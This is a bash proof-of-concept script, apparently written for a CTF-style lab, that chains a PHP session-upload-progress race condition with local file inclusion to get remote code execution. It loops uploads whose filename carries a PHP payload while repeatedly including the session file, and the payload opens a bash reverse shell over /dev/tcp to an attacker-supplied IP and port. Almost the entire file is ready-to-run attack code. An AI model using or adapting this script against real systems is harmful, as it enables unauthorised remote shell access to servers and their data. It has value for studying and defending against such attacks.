#!/bin/bash
# made by Taylor Christian Newsome

# Exit immediately if unbound variables are used
set -u

# Display usage banner if arguments are missing
if [ "$#" -lt 2 ]; then
    echo "=========================================="
    echo " Robust LFI/RCE Race Condition PoC        "
    echo " made by Taylor Christian Newsome         "
    echo "=========================================="
    echo "Usage: sudo bash poc.sh <target-ip> <attacker-ip> [attacker-port]"
    echo "Example: sudo bash poc.sh 10.10.11.x 10.10.14.x 4444"
    exit 1
fi

TARGET="$1"
ATTACKER_IP="$2"
ATTACKER_PORT="${3:-4444}"
SESSION_ID="testkey"

UPLOAD_URL="http://${TARGET}/upload.php"
LFI_URL="http://${TARGET}/index.php?page="

# 1. Dependency Error Handling: Check if curl is available
if ! command -v curl &> /dev/null; then
    echo "[-] Error: Required dependency 'curl' is not installed." >&2
    exit 1
fi

# 2. Network Connectivity Error Handling: Verify target is reachable
echo "[*] Checking connectivity to target: ${TARGET}..."
if ! curl -s --head --connect-timeout 5 "http://${TARGET}" > /dev/null 2>&1; then
    echo "[-] Error: Target ${TARGET} is unreachable or HTTP service is offline." >&2
    exit 1
fi

# Real payload logic: PHP execution wrapper that triggers a reverse shell via system()
PAYLOAD="<?php system('nohup bash -c \"bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1\" >/dev/null 2>&1 &'); ?>"

echo "=========================================="
echo " Robust LFI/RCE Race Condition PoC        "
echo " made by Taylor Christian Newsome         "
echo "=========================================="
echo "[*] Target Host:     ${TARGET}"
echo "[*] Session ID:      ${SESSION_ID}"
echo "[*] Reverse Shell:   ${ATTACKER_IP}:${ATTACKER_PORT}"
echo "----------------------------------------"
echo "[*] Reminder: Ensure your netcat listener is active:"
echo "    nc -lvnp ${ATTACKER_PORT}"
echo "[*] Launching concurrent processes..."

# Ensure background processes are terminated cleanly upon exit or interruption
trap "kill 0 2>/dev/null; exit 0" EXIT INT TERM

# 3. Background Uploader Process with resilient error suppression
(
    while true; do
        curl -s -X POST "${UPLOAD_URL}" \
            -b "PHPSESSID=${SESSION_ID}" \
            -F "PHP_SESSION_UPLOAD_PROGRESS=${SESSION_ID}" \
            -F "file=@-;filename=${PAYLOAD}" <<< "A" > /dev/null 2>&1
        sleep 0.01
    done
) &

# 4. Foreground Includer Process with timeout and connection error protection
while true; do
    for path in "/var/lib/php/sessions/sess_${SESSION_ID}" "/tmp/sess_${SESSION_ID}"; do
        response=$(curl -s --connect-timeout 1 "${LFI_URL}${path}" 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$response" ]; then
            # Handle successful interaction logic here
            sleep 0.01
        fi
    done
    sleep 0.01
done
